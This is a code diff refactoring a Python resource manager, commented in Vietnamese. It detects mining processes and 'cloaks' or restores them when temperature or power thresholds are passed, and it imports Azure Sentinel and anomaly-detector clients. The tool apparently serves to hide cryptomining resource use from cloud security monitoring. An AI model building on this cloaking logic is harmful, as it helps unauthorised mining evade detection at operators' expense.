@@ -1,29 +1,23 @@
 # resource_manager.py
 
-import os
 import logging
 import psutil
 import pynvml
 import traceback
 import asyncio
-import aiorwlock
-
 from asyncio import Queue as AsyncQueue, Event
 from typing import List, Any, Dict, Optional, Tuple
 from itertools import count
 from contextlib import asynccontextmanager
-from threading import Lock
 
-import aiofiles  # Dùng để xử lý I/O bất đồng bộ
+import aiofiles
+import aiorwlock
 
-# Các module nội bộ
-from .base_manager import BaseManager
+
 from .utils import MiningProcess
-from .cloak_strategies import CloakStrategy, CloakStrategyFactory
+from .cloak_strategies import CloakStrategyFactory
 from .resource_control import ResourceControlFactory
-from .interfaces import IResourceManager
 
-# Chỉ giữ lại các Azure clients cần dùng
 from .azure_clients import (
     AzureSentinelClient,
     AzureLogAnalyticsClient,
@@ -31,6 +25,9 @@ from .azure_clients import (
     AzureAnomalyDetectorClient
 )
 
+from .auxiliary_modules.interfaces import IResourceManager
+from .auxiliary_modules.models import ConfigModel
+from .auxiliary_modules.event_bus import EventBus
 from .auxiliary_modules import temperature_monitor
 from .auxiliary_modules.power_management import (
     PowerManager,
@@ -47,19 +44,7 @@ from .auxiliary_modules.power_management import (
 @asynccontextmanager
 async def acquire_lock_with_timeout(lock: aiorwlock.RWLock, lock_type: str, timeout: float):
     """
-    Async context manager để chiếm khóa đọc/ghi (a reader-writer lock) với thời gian chờ.
-
-    Args:
-        lock (aiorwlock.RWLock): Đối tượng khóa đọc/ghi.
-        lock_type (str): Loại khóa cần chiếm ('read' hoặc 'write').
-        timeout (float): Thời gian chờ tối đa.
-
-    Yields:
-        Optional[aiorwlock.RWLock.ReadLock or aiorwlock.RWLock.WriteLock]: Khóa đã chiếm được hoặc None nếu timeout.
-    
-    Raises:
-        ValueError: Nếu lock_type không hợp lệ.
-        asyncio.TimeoutError: Nếu không chiếm được khóa trong thời gian chờ.
+    Async context manager để chiếm khóa đọc/ghi với thời gian chờ.
     """
     if lock_type == 'read':
         lock_to_acquire = lock.reader_lock
@@ -85,11 +70,10 @@ async def acquire_lock_with_timeout(lock: aiorwlock.RWLock, lock_type: str, time
 
 class SharedResourceManager:
     """
-    Quản lý tài nguyên chung (CPU, RAM, GPU, Disk, Network...),
-    thay thế GPUManager và tự quản lý pynvml cho GPU.
+    Quản lý tài nguyên chung (CPU, RAM, GPU, Disk, Network...).
     """
 
-    def __init__(self, config: Dict[str, Any], logger: logging.Logger, resource_managers: Dict[str, Any]):
+    def __init__(self, config: ConfigModel, logger: logging.Logger, resource_managers: Dict[str, Any]):
         self.config = config
         self.logger = logger
         self.resource_managers = resource_managers
@@ -237,7 +221,6 @@ class SharedResourceManager:
     async def restore_resources(self, process: MiningProcess):
         """
         Khôi phục tài nguyên cho tiến trình đã cloaked.
-        Gọi theo cơ chế event-driven khi đủ điều kiện an toàn để khôi phục.
         """
         try:
             pid = process.pid
@@ -263,7 +246,7 @@ class SharedResourceManager:
             self.logger.error(f"Không đủ quyền khôi phục tài nguyên cho PID={process.pid}.")
         except Exception as e:
             self.logger.error(
-                f"Lỗi khi khôi phục tài nguyên cho {name} (PID: {pid}): {e}\n{traceback.format_exc()}"
+                f"Lỗi khi khôi phục tài nguyên cho {name} (PID={pid}): {e}\n{traceback.format_exc()}"
             )
             raise
 
@@ -271,32 +254,31 @@ class SharedResourceManager:
 #                  LỚP ResourceManager (SINGLETON) CHÍNH                      #
 ###############################################################################
 
-class ResourceManager(BaseManager, IResourceManager):
+class ResourceManager(IResourceManager):
     """
     Lớp quản lý tài nguyên hệ thống, giám sát và điều chỉnh tài nguyên
     cho các tiến trình khai thác (CPU, RAM, GPU, Disk, Network...).
     Áp dụng mô hình event-driven (watcher).
     """
-    _instance = None
-    _instance_lock = Lock()
 
-    def __new__(cls, *args, **kwargs):
-        with cls._instance_lock:
-            if cls._instance is None:
-                cls._instance = super().__new__(cls)
+    _instance = None
+    _instance_lock = asyncio.Lock()
+
+    def __new__(cls, config: ConfigModel, event_bus: EventBus, logger: logging.Logger):
+        if not hasattr(cls, '_instance'):
+            cls._instance = super(ResourceManager, cls).__new__(cls)
         return cls._instance
 
-    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
-        BaseManager.__init__(self, config, logger)
-
-        if getattr(self, '_initialized', False):
+    def __init__(self, config: ConfigModel, event_bus: EventBus, logger: logging.Logger):
+        if hasattr(self, '_initialized') and self._initialized:
             return
         self._initialized = True
 
-        self.logger = logger
         self.config = config
+        self.event_bus = event_bus
+        self.logger = logger
 
-        self.stop_event = Event()
+        self.stop_event = asyncio.Event()
         self.resource_lock = aiorwlock.RWLock()
         self.resource_adjustment_queue = AsyncQueue()
 
@@ -310,6 +292,9 @@ class ResourceManager(BaseManager, IResourceManager):
 
         # Khởi tạo SharedResourceManager sau
         self.shared_resource_manager: Optional[SharedResourceManager] = None
+
+        # Đăng ký lắng nghe các sự kiện từ EventBus
+        self.event_bus.subscribe('resource_adjustment', self.handle_resource_adjustment)
 
     async def start(self):
         """
@@ -362,7 +347,7 @@ class ResourceManager(BaseManager, IResourceManager):
             self.logger.error(f"Lỗi khám phá Azure: {e}\n{traceback.format_exc()}")
 
     async def is_gpu_initialized(self) -> bool:
-        """Giữ lại cho tương thích, thực chất kiểm tra NVML."""
+        """Kiểm tra NVML đã được khởi tạo hay chưa."""
         if self.shared_resource_manager:
             return self.shared_resource_manager.is_nvml_initialized()
         return False
@@ -381,8 +366,8 @@ class ResourceManager(BaseManager, IResourceManager):
         Tìm các tiến trình khai thác đang chạy trên hệ thống (qua config).
         """
         try:
-            cpu_name = self.config['processes'].get('CPU', '').lower()
-            gpu_name = self.config['processes'].get('GPU', '').lower()
+            cpu_name = self.config.processes.get('CPU', '').lower()
+            gpu_name = self.config.processes.get('GPU', '').lower()
 
             async with acquire_lock_with_timeout(self.mining_processes_lock, 'write', timeout=5) as write_lock:
                 if write_lock is None:
@@ -395,7 +380,7 @@ class ResourceManager(BaseManager, IResourceManager):
                         pname = proc.info['name'].lower()
                         if cpu_name in pname or gpu_name in pname:
                             prio = self.get_process_priority(proc.info['name'])
-                            net_if = self.config.get('network_interface', 'eth0')
+                            net_if = self.config.network_interface
                             self.mining_processes.append(
                                 MiningProcess(proc.info['pid'], proc.info['name'], prio, net_if, self.logger)
                             )
@@ -410,7 +395,7 @@ class ResourceManager(BaseManager, IResourceManager):
         """
         Lấy độ ưu tiên (priority) dựa trên config.
         """
-        priority_map = self.config.get('process_priority_map', {})
+        priority_map = self.config.process_priority_map
         pri_val = priority_map.get(process_name.lower(), 1)
         if not isinstance(pri_val, int):
             self.logger.warning(f"Priority cho '{process_name}' không phải int => gán = 1.")
@@ -420,6 +405,13 @@ class ResourceManager(BaseManager, IResourceManager):
     ##########################################################################
     #                         HÀNG ĐỢI SỰ KIỆN CLOAK/RESTORE                 #
     ##########################################################################
+
+    async def handle_resource_adjustment(self, task: Dict[str, Any]):
+        """
+        Xử lý các sự kiện điều chỉnh tài nguyên từ EventBus.
+        """
+        await self.resource_adjustment_queue.put(task)
+        self.logger.info(f"Đã nhận sự kiện điều chỉnh tài nguyên: {task['type']} cho PID={task.get('process').pid}")
 
     async def enqueue_cloaking(self, process: MiningProcess):
         """Thêm vào queue để cloaking."""
@@ -453,92 +445,7 @@ class ResourceManager(BaseManager, IResourceManager):
             self.logger.error(f"Không thể enqueue restore PID={process.pid}: {e}\n{traceback.format_exc()}")
 
     ##########################################################################
-    #                       THU THẬP METRICS CHO ANOMALY                      #
-    ##########################################################################
-
-    async def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
-        """
-        Thu thập metrics cho 1 tiến trình, phục vụ AnomalyDetector hoặc watchers.
-        """
-        try:
-            if not psutil.pid_exists(process.pid):
-                self.logger.warning(f"PID={process.pid} không tồn tại.")
-                return {}
-
-            p_obj = psutil.Process(process.pid)
-            cpu_pct = p_obj.cpu_percent(interval=1)
-            mem_mb = p_obj.memory_info().rss / (1024**2)
-
-            gpu_pct = 0.0
-            if await self.is_gpu_initialized():
-                gpu_pct = await self.shared_resource_manager.get_gpu_usage_percent(process.pid)
-
-            # Ví dụ disk I/O (mock)
-            disk_mbps = await asyncio.get_event_loop().run_in_executor(
-                None, temperature_monitor.get_current_disk_io_limit, process.pid
-            )
-            net_bw = float(
-                self.config.get('resource_allocation', {}).get('network', {}).get('bandwidth_limit_mbps', 100.0)
-            )
-
-            cache_l = await self.shared_resource_manager.get_process_cache_usage(process.pid)
-
-            if 'memory' in self.shared_resource_manager.resource_managers:
-                memory_limit_mb = (
-                    self.shared_resource_manager.resource_managers['memory'].get_memory_limit(process.pid)
-                    / (1024**2)
-                )
-            else:
-                memory_limit_mb = 0.0
-
-            metrics = {
-                'cpu_usage_percent': float(cpu_pct),
-                'memory_usage_mb': float(mem_mb),
-                'gpu_usage_percent': float(gpu_pct),
-                'disk_io_mbps': float(disk_mbps),
-                'network_bandwidth_mbps': net_bw,
-                'cache_limit_percent': float(cache_l),
-                'memory_limit_mb': float(memory_limit_mb)
-            }
-
-            invalid_metrics = [k for k, v in metrics.items() if not isinstance(v, (int, float))]
-            if invalid_metrics:
-                self.logger.error(f"Metrics PID={process.pid} chứa giá trị không hợp lệ: {invalid_metrics}.")
-                return {}
-
-            self.logger.debug(f"Metrics PID={process.pid}: {metrics}")
-            return metrics
-
-        except Exception as e:
-            self.logger.error(f"Lỗi collect_metrics PID={process.pid}: {e}\n{traceback.format_exc()}")
-            return {}
-
-    async def collect_all_metrics(self) -> Dict[str, Any]:
-        """
-        Thu thập metrics cho tất cả tiến trình khai thác.
-        """
-        metrics_data = {}
-        try:
-            async with acquire_lock_with_timeout(self.mining_processes_lock, 'read', 5) as read_lock:
-                if read_lock is None:
-                    self.logger.error("Timeout khi acquire lock để collect_all_metrics.")
-                    return metrics_data
-
-                tasks = [self.collect_metrics(proc) for proc in self.mining_processes]
-                results = await asyncio.gather(*tasks)
-
-                for proc, metrics in zip(self.mining_processes, results):
-                    if isinstance(metrics, dict):
-                        metrics_data[str(proc.pid)] = metrics
-
-                self.logger.debug(f"Collected metrics data: {metrics_data}")
-
-        except Exception as e:
-            self.logger.error(f"Lỗi collect_all_metrics: {e}\n{traceback.format_exc()}")
-        return metrics_data
-
-    ##########################################################################
-    #                    TIẾN TRÌNH CHÍNH XỬ LÝ SỰ KIỆN (QUEUE)              #
+    #                           PHÁT HIỆN BẤT THƯỜNG                          #
     ##########################################################################
 
     async def process_resource_adjustments(self):
@@ -583,9 +490,9 @@ class ResourceManager(BaseManager, IResourceManager):
         """
         Watcher giám sát nhiệt độ CPU/GPU. Nếu vượt ngưỡng => enqueue cloaking.
         """
-        mon_params = self.config.get("monitoring_parameters", {})
+        mon_params = self.config.monitoring_parameters
         temp_intv = mon_params.get("temperature_monitoring_interval_seconds", 60)
-        temp_lims = self.config.get("temperature_limits", {})
+        temp_lims = self.config.temperature_limits
         cpu_max_temp = temp_lims.get("cpu_max_celsius", 75)
         gpu_max_temp = temp_lims.get("gpu_max_celsius", 85)
 
@@ -636,9 +543,9 @@ class ResourceManager(BaseManager, IResourceManager):
         """
         Watcher giám sát công suất CPU/GPU. Nếu vượt ngưỡng => enqueue cloaking.
         """
-        mon_params = self.config.get("monitoring_parameters", {})
+        mon_params = self.config.monitoring_parameters
         power_intv = mon_params.get("power_monitoring_interval_seconds", 60)
-        power_limits = self.config.get("power_limits", {})
+        power_limits = self.config.power_limits
         per_dev_power = power_limits.get("per_device_power_watts", {})
         cpu_max_pwr = per_dev_power.get("cpu", 150)
         gpu_max_pwr = per_dev_power.get("gpu", 300)
@@ -726,3 +633,4 @@ class ResourceManager(BaseManager, IResourceManager):
         await asyncio.gather(*tasks)
 
         self.logger.info("ResourceManager đã dừng.")
+
